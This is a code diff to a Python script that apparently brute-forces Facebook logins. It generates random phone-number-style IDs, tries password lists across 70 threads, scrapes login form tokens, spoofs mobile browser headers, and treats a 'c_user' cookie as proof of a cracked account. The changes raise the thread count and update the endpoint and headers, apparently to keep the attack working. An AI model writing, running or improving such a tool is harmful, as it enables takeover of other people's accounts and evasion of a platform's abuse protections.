@@ -723,7 +723,7 @@ def NUM():
   for nmbr in range(limit):
     nmp = ''.join(random.choice(string.digits) for _ in range(6))
     user.append(nmp)
-  with tred(max_workers=30) as king_xd:
+  with tred(max_workers=70) as king_xd:
     os.system('clear')
     tl = str(len(user))
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
@@ -768,7 +768,7 @@ def digittt():
   for nmbr in range(limit):
     nmp = ''.join(random.choice(string.digits) for _ in range(6))
     user.append(nmp)
-  with tred(max_workers=30) as king_xd:
+  with tred(max_workers=70) as king_xd:
     os.system('clear')
     tl = str(len(user))
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
@@ -813,7 +813,7 @@ def mix():
   for nmbr in range(limit):
     nmp = ''.join(random.choice(string.digits) for _ in range(6))
     user.append(nmp)
-  with tred(max_workers=30) as king_xd:
+  with tred(max_workers=70) as king_xd:
     os.system('clear')
     tl = str(len(user))
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
@@ -1209,7 +1209,7 @@ def m6(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get('https://lm.facebook.com').text
+   free_fb = session.get('https://m.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1220,23 +1220,22 @@ def m6(idf,pwv):
             "email":idf,
             "pass":ps,
             "login":"Log In"}
-   header_freefb = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
+   header_freefb ={'authority':'m.facebook.com',
+            'method': 'POST',
             'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="60", "Not)A;Brand";v="8", "Chromium";v="60"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-encoding':'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 8; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.0.0 Mobile Safari/537.36'}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
    lo = session.post('https://accountscenter.facebook.com/password_and_security/login_activity/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
